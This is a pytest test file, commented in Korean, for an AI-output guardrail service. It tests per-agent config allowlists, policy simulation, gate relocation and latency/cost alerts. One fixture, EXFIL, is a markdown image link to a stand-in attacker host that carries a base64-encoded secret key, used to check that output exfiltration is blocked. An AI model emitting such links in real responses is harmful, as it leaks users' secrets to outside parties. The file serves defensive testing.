"""Epic 27 — 에이전트 설정(정책 agentParams)·관문 상세(SCR-D02)·강등 현황(SCR-D06)."""
import yaml
from sqlalchemy import select

from aegis.manifest import ConfigParam, check_param
from app import db, evidence_writer, gating, models

EXFIL = "![x](https://evil.example/p.png?d=c2VjcmV0X2tleT1zay1hbnQtYXBpMDM)"
CDN = "![x](https://img.cdn.garam.example/p.png?d=c2VjcmV0X2tleT1zay1hbnQtYXBpMDM)"


def out(client, text, params=None):
    req = {"output": text, "subject": {"principal": {"id": "dev.cfg"}}} | ({"params": params} if params else {})
    r = client.post("/v1/judge:batch", json={"gate": "output", "agents": ["d1-06"], "request": req})
    assert r.status_code == 200, r.text
    return r.json()


def put(client, values, reason="허용 CDN 등록"):
    return client.put("/v1/agents/d1-06/config", json={"values": values, "reason": reason})


def test_manifest_config_declared_and_checked(migrated):
    p = ConfigParam.model_validate({"type": "list", "items": "string", "labelKo": "a", "labelEn": "a"})
    assert check_param(p, ["x"]) is None and check_param(p, "x") and check_param(p, [1])
    n = ConfigParam.model_validate({"type": "number", "min": 0, "max": 1, "labelKo": "a", "labelEn": "a"})
    assert check_param(n, 0.5) is None and check_param(n, 2) and check_param(n, True)
    with db.system_session() as s:
        declared = {a.id: a.manifest["spec"].get("config") or {} for a in s.scalars(select(models.Agent))}
    assert "urlAllowlist" in declared["d1-06"] and "canaries" in declared["d1-07"] and "spendLimit" in declared["d6-07"]
    assert sum(len(v) for v in declared.values()) >= 80


def test_policy_params_win_over_caller(client):
    cfg = client.get("/v1/agents/d1-06/config").json()
    assert cfg["schema"]["urlAllowlist"]["type"] == "list" and cfg["values"] == {}
    # 정책에 값이 없으면 호출자가 허용목록을 넓혀도 무시된다(엔진 기본값 = 빈 목록)
    assert out(client, CDN, {"urlAllowlist": ["garam.example"]})["verdict"] == "block"
    before = client.get("/v1/policies/default").json()["version"]
    try:
        r = put(client, {"urlAllowlist": ["garam.example"]})
        assert r.status_code == 200, r.text
        d = r.json()
        assert d["changed"] and d["values"] == {"urlAllowlist": ["garam.example"]} and d["policy"] == f"default@v{before + 1}"
        assert out(client, CDN)["verdict"] == "allow"                          # 정책 허용목록 적용
        assert out(client, CDN, {"urlAllowlist": []})["verdict"] == "allow"    # 호출자가 좁혀도 정책 값
        assert out(client, EXFIL, {"urlAllowlist": ["evil.example"]})["verdict"] == "block"   # 호출자가 넓혀도 무시
        with db.system_session() as s:
            rec = s.scalars(select(models.Evidence).where(models.Evidence.kind == "policy", models.Evidence.ref_id == f"default@v{before + 1}")).one()
        assert rec.body["note"] == "agent config d1-06: 허용 CDN 등록" and rec.body["body"]["spec"]["agentParams"]["d1-06"]
        assert put(client, {"urlAllowlist": ["garam.example"]}).json()["changed"] is False   # 같은 값 = 새 버전 없음
    finally:
        assert put(client, {}, "원복").status_code == 200
    assert "agentParams" not in client.get("/v1/policies/default").json()["body"]["spec"]


def test_config_validation(client):
    assert client.put("/v1/agents/d1-06/config", json={"values": {"urlAllowlist": "garam.example"}, "reason": "x"}).status_code == 422
    assert client.put("/v1/agents/d1-06/config", json={"values": {"nope": 1}, "reason": "x"}).status_code == 422
    assert client.put("/v1/agents/d1-06/config", json={"values": {"urlAllowlist": ["a"]}}).status_code == 422     # 사유 필수
    assert client.put("/v1/agents/d6-01/config", json={"values": {"autonomyLevel": 9}, "reason": "x"}).status_code == 422
    bad = {"apiVersion": "aegismesh/v1", "kind": "Policy", "metadata": {"id": "default"},
           "spec": {"agentParams": {"d1-06": {"undeclared": True}}}}
    r = client.post("/v1/policies", content=yaml.safe_dump(bad))
    assert r.status_code == 422 and "선언되지 않은 설정" in r.text
    bad["spec"] = {"relocated": ["d7-02"]}                                   # 상시 계열은 재배치 대상 아님
    assert client.post("/v1/policies", content=yaml.safe_dump(bad)).status_code == 422
    r = client.put("/v1/agents/d1-06/config", json={"values": {"urlAllowlist": ["a"]}, "reason": "x"}, headers={"Authorization": "Bearer x"})
    assert r.status_code == 401


def test_config_test_reports_impact_without_saving(client, as_user):
    before = client.get("/v1/policies/default").json()["version"]
    r = client.post("/v1/agents/d1-06/config:test", json={"values": {"urlAllowlist": ["evil.example"]}, "sample": {"output": EXFIL}})
    assert r.status_code == 200, r.text
    d = r.json()
    assert d["ok"] and d["impact"]["attacks"]["total"] > 0
    assert d["impact"]["attacks"]["detectedAfter"] < d["impact"]["attacks"]["detectedBefore"]    # 공격 표본이 허용목록 탓에 통과 → 미탐 증가
    assert any(c["set"] == "attacks" and c["after"] == "allow" for c in d["impact"]["changed"])
    assert d["sample"]["current"]["verdict"] == "block" and d["sample"]["draft"]["verdict"] == "allow" and d["sample"]["changed"]
    assert "agentParams" in d["diff"]
    assert client.get("/v1/policies/default").json()["version"] == before
    viewer = as_user("aud.cfg", "auditor")
    assert client.post("/v1/agents/d1-06/config:test", json={"values": {}}, headers=viewer).status_code == 403
    assert client.get("/v1/agents/d1-06/config", headers=viewer).status_code == 200


def test_simulator_reruns_with_draft_params(client):
    pol = client.get("/v1/policies/default").json()["body"]
    pol["spec"]["agentParams"] = {"d1-06": {"urlAllowlist": ["garam.example"]}}
    r = client.post("/v1/policies:simulate", json={"gate": "output", "agents": ["d1-06"], "request": {"output": CDN},
                                                   "draft": yaml.safe_dump(pol, allow_unicode=True)})
    assert r.status_code == 200, r.text
    d = r.json()
    assert d["deployed"]["verdict"] == "block" and d["draft"]["verdict"] == "allow"
    assert d["changed"] == [{"ruleId": d["draft"]["decisions"][0]["ruleId"], "agent": "d1-06", "deployed": "block", "draft": "allow"}]


def _approve(client, as_user, ref):
    for who in ("apr.one", "apr.two"):
        r = client.post(f"/v1/approvals/{ref}:decide", json={"decision": "approve", "reason": "지연 예산 확인"}, headers=as_user(who, "approver"))
        assert r.status_code == 200, r.text
    return r.json()


def test_relocation_runs_async_and_cannot_block(client, as_user):
    r = client.post("/v1/gates/output/relocations", json={"agent": "d1-06", "reason": "p95 예산 초과"})
    assert r.status_code == 202, r.text
    assert client.post("/v1/gates/output/relocations", json={"agent": "d1-06", "reason": "중복"}).status_code == 409
    assert client.post("/v1/gates/input/relocations", json={"agent": "d1-06", "reason": "관문 불일치"}).status_code == 404
    _approve(client, as_user, r.json()["approvalRef"])
    try:
        assert "d1-06" in client.get("/v1/policies/default").json()["body"]["spec"]["relocated"]
        d = out(client, EXFIL)
        assert d["verdict"] == "allow" and d["relocated"] == ["d1-06"] and d["agents"] == []
        gating.drain()
        evidence_writer.flush()
        with db.system_session() as s:
            f = s.scalars(select(models.Finding).where(models.Finding.trace_id == d["traceId"])).one()
            rec = s.scalars(select(models.Evidence).where(models.Evidence.kind == "gate_async", models.Evidence.ref_id == d["traceId"])).one()
        assert f.agent_id == "d1-06" and f.verdict == "block" and f.body["effectiveVerdict"] == "alert"     # 응답 후 판정 — 차단 불가
        assert rec.body["relocated"] and rec.body["verdict"] == "alert"
        det = client.get("/v1/gates/output").json()
        assert any(x["agent"] == "d1-06" for x in det["relocated"])
    finally:
        r = client.post("/v1/gates/output/relocations", json={"agent": "d1-06", "reason": "원복", "restore": True})
        assert r.status_code == 202, r.text
        _approve(client, as_user, r.json()["approvalRef"])
    assert "relocated" not in client.get("/v1/policies/default").json()["body"]["spec"]
    assert out(client, EXFIL)["verdict"] == "block"


def test_gate_detail_degradation_status(client):
    client.post("/v1/profiles/chatbot-baseline:apply", json={"target": "cfg.example"})
    for _ in range(3):
        client.post("/v1/judge:batch", json={"gate": "output", "target": "cfg.example", "request": {"output": "안녕하세요"}})
    d = client.get("/v1/gates/output?hours=24").json()
    assert d["budgetMs"] == 150 and d["records"] >= 3 and len(d["histogram"]) == 8 and d["agents"]
    assert {"p50Ms", "p95Ms", "p99Ms", "budgetMs", "timeoutMs", "state", "dailyP95", "fpRate"} <= set(d["agents"][0])
    assert sum(b["count"] for b in d["histogram"]) == d["records"] and d["cost"] is None
    assert client.get("/v1/gates/nope").status_code == 404
    ign = client.post("/v1/gates/output/relocations:ignore", json={"agent": d["agents"][0]["id"], "reason": "표시 우선 유지"})
    assert ign.status_code == 200
    g = client.get("/v1/gates/degradation").json()
    assert {c["id"] for c in g["components"]} == {"inline", "pdp", "ledger", "registry", "sandbox"}
    assert g["dp5"]["violations"] == [] and len(g["failModes"]) >= 80 and "MSG-006" in g["isolation"]
    st = client.get("/v1/gates:status").json()
    assert set(st["gates"]) == {"input", "tool", "output"} and st["gates"]["output"]["records"] >= 3


def test_budgets_cost_alert(client):
    pol = client.get("/v1/policies/default").json()["body"]
    pol["spec"]["budgets"] = {"costPer1k": 3.2, "monthlyBudget": 1, "alertRatio": 0.8}
    assert client.post("/v1/policies", content=yaml.safe_dump(pol, allow_unicode=True)).status_code == 201
    try:
        d = client.get("/v1/gates/output?hours=24").json()
        assert d["cost"]["per1k"] == 3.2 and d["cost"]["ratio"] is not None
        assert d["records"] == 0 or any(a["kind"] == "cost" for a in d["alerts"])
    finally:
        pol["spec"].pop("budgets")
        assert client.post("/v1/policies", content=yaml.safe_dump(pol, allow_unicode=True)).status_code == 201


def test_slo_check_feeds_notifications(client):
    from app import gates
    pol = client.get("/v1/policies/default").json()["body"]
    pol["spec"]["budgets"] = {"costPer1k": 1000, "monthlyBudget": 1}
    assert client.post("/v1/policies", content=yaml.safe_dump(pol, allow_unicode=True)).status_code == 201
    try:
        client.post("/v1/judge:batch", json={"gate": "output", "agents": ["d1-06"], "request": {"output": "slo"}})
        evidence_writer.flush()
        with db.system_session() as s:
            alerts = gates.slo_check(s, "test")
            s.commit()
        assert any(a["kind"] == "cost" and a["tenant"] == "default" for a in alerts)
        items = client.get("/v1/notifications?hours=1").json()["items"]
        assert any(n["kind"] == "비용·SLO" and n["href"] == "/gates/output" for n in items)
    finally:
        pol["spec"].pop("budgets")
        assert client.post("/v1/policies", content=yaml.safe_dump(pol, allow_unicode=True)).status_code == 201
